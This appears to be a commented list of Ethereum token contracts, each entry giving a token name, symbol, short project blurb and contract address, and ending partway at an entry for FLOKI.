// DIA is delivering verifiable financial data from traditional and crypto sources to its community.
// 0x84cA8bc7997272c7CfB4D0Cd3D55cd942B3c9419

// EverRise (RISE)
// EverRise is a blockchain technology company that offers bridging and security solutions across blockchains through an ecosystem of decentralized applications. The EverRise token (RISE) is a multi-chain, collateralized cryptocurrency that powers the EverRise dApp ecosystem.
// 0xC17c30e98541188614dF99239cABD40280810cA3

// Refereum (RFR)
// Distribution and growth platform for games.
// 0xd0929d411954c47438dc1d871dd6081f5c5e149c


// bZx Protocol Token (BZRX)
// BZRX token.
// 0x56d811088235F11C8920698a204A5010a788f4b3

// CoinDash Token (CDT)
// Blox is an open-source, fully non-custodial staking platform for Ethereum 2.0. Their goal at Blox is to simplify staking while ensuring Ethereum stays fair and decentralized.
// 0x177d39ac676ed1c67a2b268ad7f1e58826e5b0af

// Nectar (NCT)
// Decentralized marketplace where security experts build anti-malware engines that compete to protect you.
// 0x9e46a38f5daabe8683e10793b06749eef7d733d1

// Wirex Token (WXT)
// Wirex is a worldwide digital payment platform and regulated institution endeavoring to make digital money accessible to everyone. XT is a utility token and used as a backbone for Wirex's reward system called X-Tras
// 0xa02120696c7b8fe16c09c749e4598819b2b0e915

// FOX (FOX)
// FOX is ShapeShift’s official loyalty token. Holders of FOX enjoy zero-commission trading and win ongoing USDC crypto payments from Rainfall (payments increase in proportion to your FOX holdings). Use at ShapeShift.com.
// 0xc770eefad204b5180df6a14ee197d99d808ee52d

// Tellor Tributes (TRB)
// Tellor is a decentralized oracle that provides an on-chain data bank where staked miners compete to add the data points.
// 0x88df592f8eb5d7bd38bfef7deb0fbc02cf3778a0

// OVR (OVR)
// OVR ecosystem allow users to earn by buying, selling or renting OVR Lands or just by stacking OVR Tokens while content creators can earn building and publishing AR experiences.
// 0x21bfbda47a0b4b5b1248c767ee49f7caa9b23697

// Ampleforth Governance (FORTH)
// FORTH is the governance token for the Ampleforth protocol. AMPL is the first rebasing currency and a key DeFi building block for denominating stable contracts.
// 0x77fba179c79de5b7653f68b5039af940ada60ce0

// Moss Coin (MOC)
// Location-based Augmented Reality Mobile Game based on Real Estate
// 0x865ec58b06bf6305b886793aa20a2da31d034e68

// ICONOMI (ICN)
// ICONOMI Digital Assets Management platform enables simple access to a variety of digital assets and combined Digital Asset Arrays
// 0x888666CA69E0f178DED6D75b5726Cee99A87D698

// Kin (KIN)
// The vision for Kin is rooted in the belief that a participants can come together to create an open ecosystem of tools for digital communication and commerce that prioritizes consumer experience, fair and user-oriented model for digital services.
// 0x818fc6c2ec5986bc6e2cbf00939d90556ab12ce5

// Cortex Coin (CTXC)
// Decentralized AI autonomous system.
// 0xea11755ae41d889ceec39a63e6ff75a02bc1c00d

// SpookyToken (BOO)
// SpookySwap is an automated market-making (AMM) decentralized exchange (DEX) for the Fantom Opera network.
// 0x55af5865807b196bd0197e0902746f31fbccfa58

// BZ (BZ)
// Digital asset trading exchanges, providing professional digital asset trading and OTC (Over The Counter) services.
// 0x4375e7ad8a01b8ec3ed041399f62d9cd120e0063

// Adventure Gold (AGLD)
// Adventure Gold is the native ERC-20 token of the Loot non-fungible token (NFT) project. Loot is a text-based, randomized adventure gear generated and stored on-chain, created by social media network Vine co-founder Dom Hofmann.
// 0x32353A6C91143bfd6C7d363B546e62a9A2489A20

// Decentral Games (DG)
// Decentral Games is a community-owned metaverse casino ecosystem powered by DG.
// 0x4b520c812e8430659fc9f12f6d0c39026c83588d

// SENTINEL PROTOCOL (UPP)
// Sentinel Protocol is a blockchain-based threat intelligence platform that defends against hacks, scams, and fraud using crowdsourced threat data collected by security experts; called the Sentinels.
// 0xc86d054809623432210c107af2e3f619dcfbf652

// MATH Token (MATH)
// Crypto wallet.
// 0x08d967bb0134f2d07f7cfb6e246680c53927dd30

// SelfKey (KEY)
// SelfKey is a blockchain based self-sovereign identity ecosystem that aims to empower individuals and companies to find more freedom, privacy and wealth through the full ownership of their digital identity.
// 0x4cc19356f2d37338b9802aa8e8fc58b0373296e7

// RHOC (RHOC)
// The RChain Platform aims to be a decentralized, economically sustainable public compute infrastructure.
// 0x168296bb09e24a88805cb9c33356536b980d3fc5

// THORSwap Token (THOR)
// THORswap is a multi-chain DEX aggregator built on THORChain's cross-chain liquidity protocol for all THORChain services like THORNames and synthetic assets.
// 0xa5f2211b9b8170f694421f2046281775e8468044

// Somnium Space Cubes (CUBE)
// We are an open, social & persistent VR world built on blockchain. Buy land, build or import objects and instantly monetize. Universe shaped entirely by players!
// 0xdf801468a808a32656d2ed2d2d80b72a129739f4

// Parsiq Token (PRQ)
// A Blockchain monitoring and compliance platform.
// 0x362bc847A3a9637d3af6624EeC853618a43ed7D2

// OKB (OKB)
// Digital Asset Exchange
// 0x75231f58b43240c9718dd58b4967c5114342a86c

// Chain (XCN)
// Chain is a cloud blockchain protocol that enables organizations to build better financial services from the ground up powered by Sequence and Chain Core.
// 0xa2cd3d43c775978a96bdbf12d733d5a1ed94fb18

// Uniswap (UNI)
// UNI token served as governance token for Uniswap protocol with 1 billion UNI have been minted at genesis. 60% of the UNI genesis supply is allocated to Uniswap community members and remaining for team, investors and advisors.
// 0x1f9840a85d5af5bf1d1762f925bdaddc4201f984

// VeChain (VEN)
// Aims to connect blockchain technology to the real world by as well as advanced IoT integration.
// 0xd850942ef8811f2a866692a623011bde52a462c1

// Frax (FRAX)
// Frax is a fractional-algorithmic stablecoin protocol. It aims to provide a highly scalable, decentralized, algorithmic money in place of fixed-supply assets like BTC. Additionally, FXS is the value accrual and governance token of the entire Frax ecosystem.
// 0x853d955acef822db058eb8505911ed77f175b99e

// TrueUSD (TUSD)
// A regulated, exchange-independent stablecoin backed 1-for-1 with US Dollars.
// 0x0000000000085d4780B73119b644AE5ecd22b376

// Wrapped Decentraland MANA (wMANA)
// The Wrapped MANA token is not transferable and has to be unwrapped 1:1 back to MANA to transfer it. This token is also not burnable or mintable (except by wrapping more tokens).
// 0xfd09cf7cfffa9932e33668311c4777cb9db3c9be

// Wrapped Filecoin (WFIL)
// Wrapped Filecoin is an Ethereum based representation of Filecoin.
// 0x6e1A19F235bE7ED8E3369eF73b196C07257494DE

// SAND (SAND)
// The Sandbox is a virtual world where players can build, own, and monetize their gaming experiences in the Ethereum blockchain using SAND, the platform’s utility token.
// 0x3845badAde8e6dFF049820680d1F14bD3903a5d0

// KuCoin Token (KCS)
// KCS performs as the key to the entire KuCoin ecosystem, and it will also be the native asset on KuCoin’s decentralized financial services as well as the governance token of KuCoin Community.
// 0xf34960d9d60be18cc1d5afc1a6f012a723a28811

// Compound USD Coin (cUSDC)
// Compound is an open-source protocol for algorithmic, efficient Money Markets on the Ethereum blockchain.
// 0x39aa39c021dfbae8fac545936693ac917d5e7563

// Pax Dollar (USDP)
// Pax Dollar (USDP) is a digital dollar redeemable one-to-one for US dollars and regulated by the New York Department of Financial Services.
// 0x8e870d67f660d95d5be530380d0ec0bd388289e1

// HuobiToken (HT)
// Huobi Global is a world-leading cryptocurrency financial services group.
// 0x6f259637dcd74c767781e37bc6133cd6a68aa161

// Huobi BTC (HBTC)
// HBTC is a standard ERC20 token backed by 100% BTC. While maintaining the equivalent value of Bitcoin, it also has the flexibility of Ethereum. A bridge between the centralized market and the DeFi market.
// 0x0316EB71485b0Ab14103307bf65a021042c6d380

// Maker (MKR)
// Maker is a Decentralized Autonomous Organization that creates and insures the dai stablecoin on the Ethereum blockchain
// 0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2

// Graph Token (GRT)
// The Graph is an indexing protocol and global API for organizing blockchain data and making it easily accessible with GraphQL.
// 0xc944e90c64b2c07662a292be6244bdf05cda44a7

// BitTorrent (BTT)
// BTT is the official token of BitTorrent Chain, mapped from BitTorrent Chain at a ratio of 1:1. BitTorrent Chain is a brand-new heterogeneous cross-chain interoperability protocol, which leverages sidechains for the scaling of smart contracts.
// 0xc669928185dbce49d2230cc9b0979be6dc797957

// Decentralized USD (USDD)
// USDD is a fully decentralized over-collateralization stablecoin.
// 0x0C10bF8FcB7Bf5412187A595ab97a3609160b5c6

// Quant (QNT)
// Blockchain operating system that connects the world’s networks and facilitates the development of multi-chain applications.
// 0x4a220e6096b25eadb88358cb44068a3248254675

// Compound Dai (cDAI)
// Compound is an open-source, autonomous protocol built for developers, to unlock a universe of new financial applications. Interest and borrowing, for the open financial system.
// 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643

// Paxos Gold (PAXG)
// PAX Gold (PAXG) tokens each represent one fine troy ounce of an LBMA-certified, London Good Delivery physical gold bar, secured in Brink’s vaults.
// 0x45804880De22913dAFE09f4980848ECE6EcbAf78

// Compound Ether (cETH)
// Compound is an open-source protocol for algorithmic, efficient Money Markets on the Ethereum blockchain.
// 0x4ddc2d193948926d02f9b1fe9e1daa0718270ed5

// Fantom Token (FTM)
// Fantom is a high-performance, scalable, customizable, and secure smart-contract platform. It is designed to overcome the limitations of previous generation blockchain platforms. Fantom is permissionless, decentralized, and open-source.
// 0x4e15361fd6b4bb609fa63c81a2be19d873717870

// Tether Gold (XAUt)
// Each XAU₮ token represents ownership of one troy fine ounce of physical gold on a specific gold bar. Furthermore, Tether Gold (XAU₮) is the only product among the competition that offers zero custody fees and has direct control over the physical gold storage.
// 0x68749665ff8d2d112fa859aa293f07a622782f38

// BitDAO (BIT)
// 0x1a4b46696b2bb4794eb3d4c26f1c55f9170fa4c5

// chiliZ (CHZ)
// Chiliz is the sports and fan engagement blockchain platform, that signed leading sports teams.
// 0x3506424f91fd33084466f402d5d97f05f8e3b4af

// BAT (BAT)
// The Basic Attention Token is the new token for the digital advertising industry.
// 0x0d8775f648430679a709e98d2b0cb6250d2887ef

// LoopringCoin V2 (LRC)
// Loopring is a DEX protocol offering orderbook-based trading infrastructure, zero-knowledge proof and an auction protocol called Oedax (Open-Ended Dutch Auction Exchange).
// 0xbbbbca6a901c926f240b89eacb641d8aec7aeafd

// Fei USD (FEI)
// Fei Protocol ($FEI) represents a direct incentive stablecoin which is undercollateralized and fully decentralized. FEI employs a stability mechanism known as direct incentives - dynamic mint rewards and burn penalties on DEX trade volume to maintain the peg.
// 0x956F47F50A910163D8BF957Cf5846D573E7f87CA

// Zilliqa (ZIL)
// Zilliqa is a high-throughput public blockchain platform - designed to scale to thousands ​of transactions per second.
// 0x05f4a42e251f2d52b8ed15e9fedaacfcef1fad27

// Amp (AMP)
// Amp is a digital collateral token designed to facilitate fast and efficient value transfer, especially for use cases that prioritize security and irreversibility. Using Amp as collateral, individuals and entities benefit from instant, verifiable assurances for any kind of asset exchange.
// 0xff20817765cb7f73d4bde2e66e067e58d11095c2

// Gala (GALA)
// Gala Games is dedicated to decentralizing the multi-billion dollar gaming industry by giving players access to their in-game items. Coming from the Co-founder of Zynga and some of the creative minds behind Farmville 2, Gala Games aims to revolutionize gaming.
// 0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA

// EnjinCoin (ENJ)
// Customizable cryptocurrency and virtual goods platform for gaming.
// 0xf629cbd94d3791c9250152bd8dfbdf380e2a3b9c

// XinFin XDCE (XDCE)
// Hybrid Blockchain technology company focused on international trade and finance.
// 0x41ab1b6fcbb2fa9dced81acbdec13ea6315f2bf2

// Wrapped Celo (wCELO)
// Wrapped Celo is a 1:1 equivalent of Celo. Celo is a utility and governance asset for the Celo community, which has a fixed supply and variable value. With Celo, you can help shape the direction of the Celo Platform.
// 0xe452e6ea2ddeb012e20db73bf5d3863a3ac8d77a

// HoloToken (HOT)
// Holo is a decentralized hosting platform based on Holochain, designed to be a scalable development framework for distributed applications.
// 0x6c6ee5e31d828de241282b9606c8e98ea48526e2

// Synthetix Network Token (SNX)
// The Synthetix Network Token (SNX) is the native token of Synthetix, a synthetic asset (Synth) issuance protocol built on Ethereum. The SNX token is used as collateral to issue Synths, ERC-20 tokens that track the price of assets like Gold, Silver, Oil and Bitcoin.
// 0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f

// Nexo (NEXO)
// Instant Crypto-backed Loans
// 0xb62132e35a6c13ee1ee0f84dc5d40bad8d815206

// HarmonyOne (ONE)
// A project to scale trust for billions of people and create a radically fair economy.
// 0x799a4202c12ca952cb311598a024c80ed371a41e

// 1INCH Token (1INCH)
// 1inch is a decentralized exchange aggregator that sources liquidity from various exchanges and is capable of splitting a single trade transaction across multiple DEXs. Smart contract technology empowers this aggregator enabling users to optimize and customize their trades.
// 0x111111111117dc0aa78b770fa6a738034120c302

// pTokens SAFEMOON (pSAFEMOON)
// Safemoon protocol aims to create a self-regenerating automatic liquidity providing protocol that would pay out static rewards to holders and penalize sellers.
// 0x16631e53c20fd2670027c6d53efe2642929b285c

// Frax Share (FXS)
// FXS is the value accrual and governance token of the entire Frax ecosystem. Frax is a fractional-algorithmic stablecoin protocol. It aims to provide a highly scalable, decentralized, algorithmic money in place of fixed-supply assets like BTC.
// 0x3432b6a60d23ca0dfca7761b7ab56459d9c964d0

// Serum (SRM)
// Serum is a decentralized derivatives exchange with trustless cross-chain trading by Project Serum, in collaboration with a consortium of crypto trading and DeFi experts.
// 0x476c5E26a75bd202a9683ffD34359C0CC15be0fF

// WQtum (WQTUM)
// 0x3103df8f05c4d8af16fd22ae63e406b97fec6938

// Olympus (OHM)
// 0x64aa3364f17a4d01c6f1751fd97c2bd3d7e7f1d5

// Gnosis (GNO)
// Crowd Sourced Wisdom - The next generation blockchain network. Speculate on anything with an easy-to-use prediction market
// 0x6810e776880c02933d47db1b9fc05908e5386b96

// MCO (MCO)
// Crypto.com, the pioneering payments and cryptocurrency platform, seeks to accelerate the world’s transition to cryptocurrency.
// 0xb63b606ac810a52cca15e44bb630fd42d8d1d83d

// Gemini dollar (GUSD)
// Gemini dollar combines the creditworthiness and price stability of the U.S. dollar with blockchain technology and the oversight of U.S. regulators.
// 0x056fd409e1d7a124bd7017459dfea2f387b6d5cd

// OMG Network (OMG)
// OmiseGO (OMG) is a public Ethereum-based financial technology for use in mainstream digital wallets
// 0xd26114cd6EE289AccF82350c8d8487fedB8A0C07

// IOSToken (IOST)
// A Secure & Scalable Blockchain for Smart Services
// 0xfa1a856cfa3409cfa145fa4e20eb270df3eb21ab

// IoTeX Network (IOTX)
// IoTeX is the next generation of the IoT-oriented blockchain platform with vast scalability, privacy, isolatability, and developability. IoTeX connects the physical world, block by block.
// 0x6fb3e0a217407efff7ca062d46c26e5d60a14d69

// NXM (NXM)
// Nexus Mutual uses the power of Ethereum so people can share risks together without the need for an insurance company.
// 0xd7c49cee7e9188cca6ad8ff264c1da2e69d4cf3b

// ZRX (ZRX)
// 0x is an open, permissionless protocol allowing for tokens to be traded on the Ethereum blockchain.
// 0xe41d2489571d322189246dafa5ebde1f4699f498

// Celsius (CEL)
// A new way to earn, borrow, and pay on the blockchain.!
// 0xaaaebe6fe48e54f431b0c390cfaf0b017d09d42d

// Magic Internet Money (MIM)
// abracadabra.money is a lending protocol that allows users to borrow a USD-pegged Stablecoin (MIM) using interest-bearing tokens as collateral.
// 0x99d8a9c45b2eca8864373a26d1459e3dff1e17f3

// Golem Network Token (GLM)
// Golem is going to create the first decentralized global market for computing power
// 0x7DD9c5Cba05E151C895FDe1CF355C9A1D5DA6429

// Compound (COMP)
// Compound governance token
// 0xc00e94cb662c3520282e6f5717214004a7f26888

// Lido DAO Token (LDO)
// Lido is a liquid staking solution for Ethereum. Lido lets users stake their ETH - with no minimum deposits or maintaining of infrastructure - whilst participating in on-chain activities, e.g. lending, to compound returns. LDO is an ERC20 token granting governance rights in the Lido DAO.
// 0x5a98fcbea516cf06857215779fd812ca3bef1b32

// HUSD (HUSD)
// HUSD is an ERC-20 token that is 1:1 ratio pegged with USD. It was issued by Stable Universal, an entity that follows US regulations.
// 0xdf574c24545e5ffecb9a659c229253d4111d87e1

// SushiToken (SUSHI)
// Be a DeFi Chef with Sushi - Swap, earn, stack yields, lend, borrow, leverage all on one decentralized, community driven platform.
// 0x6b3595068778dd592e39a122f4f5a5cf09c90fe2

// Livepeer Token (LPT)
// A decentralized video streaming protocol that empowers developers to build video enabled applications backed by a competitive market of economically incentivized service providers.
// 0x58b6a8a3302369daec383334672404ee733ab239

// WAX Token (WAX)
// Global Decentralized Marketplace for Virtual Assets.
// 0x39bb259f66e1c59d5abef88375979b4d20d98022

// Swipe (SXP)
// Swipe is a cryptocurrency wallet and debit card that enables users to spend their cryptocurrencies over the world.
// 0x8ce9137d39326ad0cd6491fb5cc0cba0e089b6a9

// Ethereum Name Service (ENS)
// Decentralised naming for wallets, websites, & more.
// 0xc18360217d8f7ab5e7c516566761ea12ce7f9d72

// APENFT (NFT)
// APENFT Fund was born with the mission to register world-class artworks as NFTs on blockchain and aim to be the ARK Funds in the NFT space to build a bridge between top-notch artists and blockchain, and to support the growth of native crypto NFT artists. Mapped from TRON network.
// 0x198d14f2ad9ce69e76ea330b374de4957c3f850a

// UMA Voting Token v1 (UMA)
// UMA is a decentralized financial contracts platform built to enable Universal Market Access.
// 0x04Fa0d235C4abf4BcF4787aF4CF447DE572eF828

// MXCToken (MXC)
// Inspiring fast, efficient, decentralized data exchanges using LPWAN-Blockchain Technology.
// 0x5ca381bbfb58f0092df149bd3d243b08b9a8386e

// SwissBorg (CHSB)
// Crypto Wealth Management.
// 0xba9d4199fab4f26efe3551d490e3821486f135ba

// Polymath (POLY)
// Polymath aims to enable securities to migrate to the blockchain.
// 0x9992ec3cf6a55b00978cddf2b27bc6882d88d1ec

// Wootrade Network (WOO)
// Wootrade is incubated by Kronos Research, which aims to solve the pain points of the diversified liquidity of the cryptocurrency market, and provides sufficient trading depth for users such as exchanges, wallets, and trading institutions with zero fees.
// 0x4691937a7508860f876c9c0a2a617e7d9e945d4b

// Dogelon (ELON)
// A universal currency for the people.
// 0x761d38e5ddf6ccf6cf7c55759d5210750b5d60f3

// yearn.finance (YFI)
// DeFi made simple.
// 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e

// PlatonCoin (PLTC)
// Platon Finance is a blockchain digital ecosystem that represents a bridge for all the people and business owners so everybody could learn, understand, use and benefit from blockchain, a revolution of technology. See the future in a new light with Platon.
// 0x429D83Bb0DCB8cdd5311e34680ADC8B12070a07f

// OriginToken (OGN)
// Origin Protocol is a platform for creating decentralized marketplaces on the blockchain.
// 0x8207c1ffc5b6804f6024322ccf34f29c3541ae26


// STASIS EURS Token (EURS)
// EURS token is a virtual financial asset that is designed to digitally mirror the EURO on the condition that its value is tied to the value of its collateral.
// 0xdb25f211ab05b1c97d595516f45794528a807ad8

// Smooth Love Potion (SLP)
// Smooth Love Potions (SLP) is a ERC-20 token that is fully tradable.
// 0xcc8fa225d80b9c7d42f96e9570156c65d6caaa25

// Balancer (BAL)
// Balancer is a n-dimensional automated market-maker that allows anyone to create or add liquidity to customizable pools and earn trading fees. Instead of the traditional constant product AMM model, Balancer’s formula is a generalization that allows any number of tokens in any weights or trading fees.
// 0xba100000625a3754423978a60c9317c58a424e3d

// renBTC (renBTC)
// renBTC is a one for one representation of BTC on Ethereum via RenVM.
// 0xeb4c2781e4eba804ce9a9803c67d0893436bb27d

// Bancor (BNT)
// Bancor is an on-chain liquidity protocol that enables constant convertibility between tokens. Conversions using Bancor are executed against on-chain liquidity pools using automated market makers to price and process transactions without order books or counterparties.
// 0x1f573d6fb3f13d689ff844b4ce37794d79a7ff1c

// Revain (REV)
// Revain is a blockchain-based review platform for the crypto community. Revain's ultimate goal is to provide high-quality reviews on all global products and services using emerging technologies like blockchain and AI.
// 0x2ef52Ed7De8c5ce03a4eF0efbe9B7450F2D7Edc9

// Rocket Pool (RPL)
// 0xd33526068d116ce69f19a9ee46f0bd304f21a51f

// Rocket Pool (RPL)
// Token contract has migrated to 0xD33526068D116cE69F19A9ee46F0bd304F21A51f
// 0xb4efd85c19999d84251304bda99e90b92300bd93

// Kyber Network Crystal v2 (KNC)
// Kyber is a blockchain-based liquidity protocol that aggregates liquidity from a wide range of reserves, powering instant and secure token exchange in any decentralized application.
// 0xdeFA4e8a7bcBA345F687a2f1456F5Edd9CE97202

// Iron Bank EUR (ibEUR)
// Fixed Forex is the collective name for USD, EUR, ZAR, JPY, CNY, AUD, AED, CAD, INR, and any other forex pairs launched under the Fixed Forex moniker.
// 0x96e61422b6a9ba0e068b6c5add4ffabc6a4aae27

// Synapse (SYN)
// Synapse is a cross-chain layer ∞ protocol powering interoperability between blockchains.
// 0x0f2d719407fdbeff09d87557abb7232601fd9f29

// XSGD (XSGD)
// StraitsX is the pioneering payments infrastructure for the digital assets space in Southeast Asia developed by Singapore-based FinTech Xfers Pte. Ltd, a Major Payment Institution licensed by the Monetary Authority of Singapore for e-money issuance
// 0x70e8de73ce538da2beed35d14187f6959a8eca96

// dYdX (DYDX)
// DYDX is a governance token that allows the dYdX community to truly govern the dYdX Layer 2 Protocol. By enabling shared control of the protocol, DYDX allows traders, liquidity providers, and partners of dYdX to work collectively towards an enhanced Protocol.
// 0x92d6c1e31e14520e676a687f0a93788b716beff5

// Reserve Rights (RSR)
// The fluctuating protocol token that plays a role in stabilizing RSV and confers the cryptographic right to purchase excess Reserve tokens as the network grows.
// 0x320623b8e4ff03373931769a31fc52a4e78b5d70

// Illuvium (ILV)
// Illuvium is a decentralized, NFT collection and auto battler game built on the Ethereum network.
// 0x767fe9edc9e0df98e07454847909b5e959d7ca0e

// CEEK (CEEK)
// Universal Currency for VR & Entertainment Industry. Working Product Partnered with NBA Teams, Universal Music and Apple
// 0xb056c38f6b7dc4064367403e26424cd2c60655e1

// Chroma (CHR)
// Chromia is a relational blockchain designed to make it much easier to make complex and scalable dapps.
// 0x8A2279d4A90B6fe1C4B30fa660cC9f926797bAA2

// Telcoin (TEL)
// A cryptocurrency distributed by your mobile operator and accepted everywhere.
// 0x467Bccd9d29f223BcE8043b84E8C8B282827790F

// KEEP Token (KEEP)
// A keep is an off-chain container for private data.
// 0x85eee30c52b0b379b046fb0f85f4f3dc3009afec

// Pundi X Token (PUNDIX)
// To provide developers increased use cases and token user base by supporting offline and online payment of their custom tokens in Pundi X‘s ecosystem.
// 0x0fd10b9899882a6f2fcb5c371e17e70fdee00c38

// PowerLedger (POWR)
// Power Ledger is a peer-to-peer marketplace for renewable energy.
// 0x595832f8fc6bf59c85c527fec3740a1b7a361269

// Render Token (RNDR)
// RNDR (Render Network) bridges GPUs across the world in order to provide much-needed power to artists, studios, and developers who rely on high-quality rendering to power their creations. The mission is to bridge the gap between GPU supply/demand through the use of distributed GPU computing.
// 0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24

// Storj (STORJ)
// Blockchain-based, end-to-end encrypted, distributed object storage, where only you have access to your data
// 0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac

// Synth sUSD (sUSD)
// A synthetic asset issued by the Synthetix protocol which tracks the price of the United States Dollar (USD). sUSD can be traded on Synthetix.Exchange for other synthetic assets through a peer-to-contract system with no slippage.
// 0x57ab1ec28d129707052df4df418d58a2d46d5f51

// BitMax token (BTMX)
// Digital asset trading platform
// 0xcca0c9c383076649604eE31b20248BC04FdF61cA

// DENT (DENT)
// Aims to disrupt the mobile operator industry by creating an open marketplace for buying and selling of mobile data.
// 0x3597bfd533a99c9aa083587b074434e61eb0a258

// FunFair (FUN)
// FunFair is a decentralised gaming platform powered by Ethereum smart contracts
// 0x419d0d8bdd9af5e606ae2232ed285aff190e711b

// XY Oracle (XYO)
// Blockchain's crypto-location oracle network
// 0x55296f69f40ea6d20e478533c15a6b08b654e758

// Metal (MTL)
// Transfer money instantly around the globe with nothing more than a phone number. Earn rewards every time you spend or make a purchase. Ditch the bank and go digital.
// 0xF433089366899D83a9f26A773D59ec7eCF30355e

// CelerToken (CELR)
// Celer Network is a layer-2 scaling platform that enables fast, easy and secure off-chain transactions.
// 0x4f9254c83eb525f9fcf346490bbb3ed28a81c667

// Ocean Token (OCEAN)
// Ocean Protocol helps developers build Web3 apps to publish, exchange and consume data.
// 0x967da4048cD07aB37855c090aAF366e4ce1b9F48

// Divi Exchange Token (DIVX)
// Digital Currency
// 0x13f11c9905a08ca76e3e853be63d4f0944326c72

// Tribe (TRIBE)
// 0xc7283b66eb1eb5fb86327f08e1b5816b0720212b

// ZEON (ZEON)
// ZEON Wallet provides a secure application that available for all major OS. Crypto-backed loans without checks.
// 0xe5b826ca2ca02f09c1725e9bd98d9a8874c30532

// Rari Governance Token (RGT)
// The Rari Governance Token is the native token behind the DeFi robo-advisor, Rari Capital.
// 0xD291E7a03283640FDc51b121aC401383A46cC623

// Injective Token (INJ)
// Access, create and trade unlimited decentralized finance markets on an Ethereum-compatible exchange protocol for cross-chain DeFi.
// 0xe28b3B32B6c345A34Ff64674606124Dd5Aceca30

// Energy Web Token Bridged (EWTB)
// Energy Web Token (EWT) is the native token of the Energy Web Chain, a public, Proof-of-Authority Ethereum Virtual Machine blockchain specifically designed to support enterprise-grade applications in the energy sector.
// 0x178c820f862b14f316509ec36b13123da19a6054

// MEDX TOKEN (MEDX)
// Decentralized healthcare information system
// 0xfd1e80508f243e64ce234ea88a5fd2827c71d4b7

// Spell Token (SPELL)
// Abracadabra.money is a lending platform that allows users to borrow funds using Interest Bearing Tokens as collateral.
// 0x090185f2135308bad17527004364ebcc2d37e5f6

// Uquid Coin (UQC)
// The goal of this blockchain asset is to supplement the development of UQUID Ecosystem. In this virtual revolution, coin holders will have the benefit of instantly and effortlessly cash out their coins.
// 0x8806926Ab68EB5a7b909DcAf6FdBe5d93271D6e2

// Mask Network (MASK)
// Mask Network allows users to encrypt content when posting on You-Know-Where and only the users and their friends can decrypt them.
// 0x69af81e73a73b40adf4f3d4223cd9b1ece623074

// Function X (FX)
// Function X is an ecosystem built entirely on and for the blockchain. It consists of five elements: f(x) OS, f(x) public blockchain, f(x) FXTP, f(x) docker and f(x) IPFS.
// 0x8c15ef5b4b21951d50e53e4fbda8298ffad25057

// Aragon Network Token (ANT)
// Create and manage unstoppable organizations. Aragon lets you manage entire organizations using the blockchain. This makes Aragon organizations more efficient than their traditional counterparties.
// 0xa117000000f279d81a1d3cc75430faa017fa5a2e

// KyberNetwork (KNC)
// KyberNetwork is a new system which allows the exchange and conversion of digital assets.
// 0xdd974d5c2e2928dea5f71b9825b8b646686bd200

// Origin Dollar (OUSD)
// Origin Dollar (OUSD) is a stablecoin that earns yield while it's still in your wallet. It was created by the team at Origin Protocol (OGN).
// 0x2a8e1e676ec238d8a992307b495b45b3feaa5e86

// QuarkChain Token (QKC)
// A High-Capacity Peer-to-Peer Transactional System
// 0xea26c4ac16d4a5a106820bc8aee85fd0b7b2b664

// Anyswap (ANY)
// Anyswap is a mpc decentralized cross-chain swap protocol.
// 0xf99d58e463a2e07e5692127302c20a191861b4d6

// Trace (TRAC)
// Purpose-built Protocol for Supply Chains Based on Blockchain.
// 0xaa7a9ca87d3694b5755f213b5d04094b8d0f0a6f

// ELF (ELF)
// elf is a decentralized self-evolving cloud computing blockchain network that aims to provide a high performance platform for commercial adoption of blockchain.
// 0xbf2179859fc6d5bee9bf9158632dc51678a4100e

// Request (REQ)
// A decentralized network built on top of Ethereum, which allows anyone, anywhere to request a payment.
// 0x8f8221afbb33998d8584a2b05749ba73c37a938a

// STPT (STPT)
// Decentralized Network for the Tokenization of any Asset.
// 0xde7d85157d9714eadf595045cc12ca4a5f3e2adb

// Ribbon (RBN)
// Ribbon uses financial engineering to create structured products that aim to deliver sustainable yield. Ribbon's first product focuses on yield through automated options strategies. The protocol also allows developers to create arbitrary structured products by combining various DeFi derivatives.
// 0x6123b0049f904d730db3c36a31167d9d4121fa6b

// HooToken (HOO)
// HooToken aims to provide safe and reliable assets management and blockchain services to users worldwide.
// 0xd241d7b5cb0ef9fc79d9e4eb9e21f5e209f52f7d

// Wrapped Celo USD (wCUSD)
// Wrapped Celo Dollars are a 1:1 equivalent of Celo Dollars. cUSD (Celo Dollars) is a stable asset that follows the US Dollar.
// 0xad3e3fc59dff318beceaab7d00eb4f68b1ecf195

// Dawn (DAWN)
// Dawn is a utility token to reward competitive gaming and help players to build their professional Esports careers.
// 0x580c8520deda0a441522aeae0f9f7a5f29629afa

// StormX (STMX)
// StormX is a gamified marketplace that enables users to earn STMX ERC-20 tokens by completing micro-tasks or shopping at global partner stores online. Users can earn staking rewards, shopping, and micro-task benefits for holding STMX in their own wallet.
// 0xbe9375c6a420d2eeb258962efb95551a5b722803

// BandToken (BAND)
// A data governance framework for Web3.0 applications operating as an open-source standard for the decentralized management of data. Band Protocol connects smart contracts with trusted off-chain information, provided through community-curated oracle data providers.
// 0xba11d00c5f74255f56a5e366f4f77f5a186d7f55

// NKN (NKN)
// NKN is the new kind of P2P network connectivity protocol & ecosystem powered by a novel public blockchain.
// 0x5cf04716ba20127f1e2297addcf4b5035000c9eb

// Reputation (REPv2)
// Augur combines the magic of prediction markets with the power of a decentralized network to create a stunningly accurate forecasting tool
// 0x221657776846890989a759ba2973e427dff5c9bb

// Alchemy (ACH)
// Alchemy Pay (ACH) is a Singapore-based payment solutions provider that provides online and offline merchants with secure, convenient fiat and crypto acceptance.
// 0xed04915c23f00a313a544955524eb7dbd823143d

// Orchid (OXT)
// Orchid enables a decentralized VPN.
// 0x4575f41308EC1483f3d399aa9a2826d74Da13Deb

// Fetch (FET)
// Fetch.ai is building tools and infrastructure to enable a decentralized digital economy by combining AI, multi-agent systems and advanced cryptography.
// 0xaea46A60368A7bD060eec7DF8CBa43b7EF41Ad85

// Propy (PRO)
// Property Transactions Secured Through Blockchain.
// 0x226bb599a12c826476e3a771454697ea52e9e220

// Adshares (ADS)
// Adshares is a Web3 protocol for monetization space in the Metaverse. Adserver platforms allow users to rent space inside Metaverse, blockchain games, NFT exhibitions and websites.
// 0xcfcecfe2bd2fed07a9145222e8a7ad9cf1ccd22a

// FLOKI (FLOKI)
